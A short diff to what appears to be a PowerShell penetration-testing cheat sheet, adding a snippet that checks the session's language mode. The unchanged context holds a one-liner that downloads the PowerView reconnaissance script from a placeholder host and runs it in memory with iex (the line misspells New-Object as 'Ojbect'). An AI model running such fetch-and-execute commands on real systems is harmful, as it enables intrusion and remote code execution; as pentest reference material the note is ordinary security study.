@@ -150,3 +150,9 @@ Get-Command -Module <ModuleName>
 ```powershell
 iex (New-Ojbect Net.webClient).DownloadString('https://server.com/powerview.ps1')
 ```
+
+# Language Mode
+```powershell
+# Check current powershell session language mode
+$ExecutionContext.SessionState.LanguageMode
+```
